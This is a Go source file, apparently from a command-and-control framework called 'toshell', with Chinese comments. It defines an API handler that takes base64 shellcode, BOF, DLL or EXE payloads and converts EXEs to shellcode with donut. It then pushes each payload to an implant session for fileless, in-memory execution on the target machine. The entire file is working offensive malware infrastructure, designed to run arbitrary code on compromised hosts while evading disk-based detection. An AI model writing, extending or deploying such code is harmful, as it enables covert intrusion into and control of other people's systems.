package api

import (
	"encoding/base64"
	"encoding/json"
	"net/http"

	"github.com/gorilla/mux"
	"toshell/internal/server/logging"
)

// filelessExecRequest 全内存无文件执行请求。
// kind: shellcode | bof | dll | exe
//   - shellcode / bof / dll：payload_b64 直接作为载荷下发，植入端不落盘执行；
//   - exe：服务端先用 donut 将 EXE 转换为位置无关 shellcode，再以 shellcode 形式下发。
type filelessExecRequest struct {
	Kind       string `json:"kind"`
	PayloadB64 string `json:"payload_b64"`
	Args       string `json:"args"`  // BOF 参数
	Entry      string `json:"entry"` // DLL 导出函数名（可选）
	Arch       string `json:"arch"`  // exe→shellcode 转换时指定目标架构
}

func (s *Server) filelessExecHandler(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")
	vars := mux.Vars(r)
	id := vars["id"]

	var req filelessExecRequest
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		http.Error(w, `{"error":"Invalid request body"}`, http.StatusBadRequest)
		return
	}
	if req.PayloadB64 == "" {
		http.Error(w, `{"error":"payload_b64 is required"}`, http.StatusBadRequest)
		return
	}
	if s.listener == nil {
		http.Error(w, `{"error":"Listener not available"}`, http.StatusInternalServerError)
		return
	}

	kind := req.Kind
	payloadB64 := req.PayloadB64

	// exe → donut shellcode：在服务端完成转换，目标机全程不落盘
	if kind == "exe" {
		raw, err := base64.StdEncoding.DecodeString(payloadB64)
		if err != nil {
			http.Error(w, `{"error":"payload_b64 is not valid base64"}`, http.StatusBadRequest)
			return
		}
		arch := req.Arch
		if arch == "" {
			arch = "amd64"
		}
		sc, err := s.builder.ConvertToShellcode(raw, arch)
		if err != nil {
			http.Error(w, `{"error":"`+err.Error()+`"}`, http.StatusInternalServerError)
			return
		}
		payloadB64 = base64.StdEncoding.EncodeToString(sc)
		kind = "shellcode"
	}

	taskInfo, err := s.taskMgr.CreateFilelessExec(id, kind, payloadB64, req.Args, req.Entry)
	if err != nil {
		http.Error(w, `{"error":"`+err.Error()+`"}`, http.StatusInternalServerError)
		return
	}
	if err := s.listener.PushTask(id, taskInfo); err != nil {
		http.Error(w, `{"error":"`+err.Error()+`"}`, http.StatusInternalServerError)
		return
	}

	logging.Info("api", "fileless-exec (%s) pushed to session %s", kind, id)
	json.NewEncoder(w).Encode(map[string]interface{}{
		"task_id":   taskInfo.ID,
		"task_type": taskInfo.TaskType,
		"kind":      kind,
		"message":   "fileless execution task pushed",
	})
}
